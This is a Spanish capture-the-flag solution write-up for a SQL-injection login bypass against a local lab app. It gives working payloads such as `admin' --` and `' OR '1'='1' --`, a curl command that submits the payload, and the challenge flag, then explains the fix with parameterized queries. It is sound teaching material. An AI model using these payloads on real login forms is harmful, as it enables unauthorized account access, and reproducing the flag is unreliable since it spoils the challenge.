# Solución — Reto 09 (Inyección SQL en el login)

## Idea clave

La aplicación construye la consulta **pegando** tu texto dentro de una cadena
SQL, en lugar de pasarlo como un dato separado. La consulta es, más o menos:

```sql
SELECT id, username, rol FROM usuarios
WHERE username = 'LO_QUE_ESCRIBAS' AND password = 'LO_QUE_ESCRIBAS'
```

Si tu texto incluye comillas y palabras clave de SQL, dejas de ser un simple
"dato" y pasas a **modificar la consulta**. Eso es una inyección SQL.

## Paso a paso

1. **Confirma que es inyectable.** En el usuario escribe solo una comilla:
   ```
   usuario:    '
   contraseña: loquesea
   ```
   Aparece un `Error de base de datos: ...` y el modo depuración enseña la
   consulta rota. Una comilla tuya ha desequilibrado las comillas del SQL →
   el campo es vulnerable.

2. **Neutraliza la contraseña.** Quieres que la consulta busque a `admin` y
   que la parte de la contraseña no estorbe. En el campo **usuario** escribe:
   ```
   admin' --
   ```
   (con un espacio después de `--`; en la contraseña, cualquier cosa).

   La consulta resultante, que ves en el modo depuración, queda:
   ```sql
   SELECT id, username, rol FROM usuarios
   WHERE username = 'admin' -- ' AND password = '...'
   ```
   Todo lo que va tras `--` es un **comentario**: la comprobación de la
   contraseña desaparece. La base de datos devuelve la fila de `admin`, la app
   te da por autenticado y, como tu rol es `admin`, muestra el panel con la flag.

3. **Una curiosidad instructiva.** El clásico `' OR '1'='1' --` también
   "entra", pero te loguea como **invitado**, no como admin: esa condición es
   cierta para *todas* las filas y la consulta devuelve la **primera** (id 1 =
   invitado). Por eso aquí el ataque dirigido (`admin' --`) es mejor que el
   genérico: no solo entras, entras *como quien tú quieres*.

   Equivalente desde la terminal, sin navegador:
   ```bash
   curl -s http://127.0.0.1:5000/login \
     --data-urlencode "usuario=admin' --" \
     --data-urlencode "contrasena=x" | grep CENTINELA
   ```

## Flag

```
CENTINELA{admin_sin_contrasena}
```

## Lección

- **La causa**: mezclar datos del usuario con el código SQL.
- **El arreglo**: consultas parametrizadas (*prepared statements*). El valor
  viaja aparte y la base de datos nunca lo interpreta como código:
  ```python
  db.execute(
      "SELECT id, username, rol FROM usuarios WHERE username = ? AND password = ?",
      (usuario, contrasena),
  )
  ```
  Con esto, escribir `admin' --` solo busca un usuario que *se llame*
  literalmente `admin' --`, que no existe.
- Y, por supuesto: nunca guardes contraseñas en texto plano (reto 04) ni dejes
  un "modo depuración" que filtre las consultas en producción.
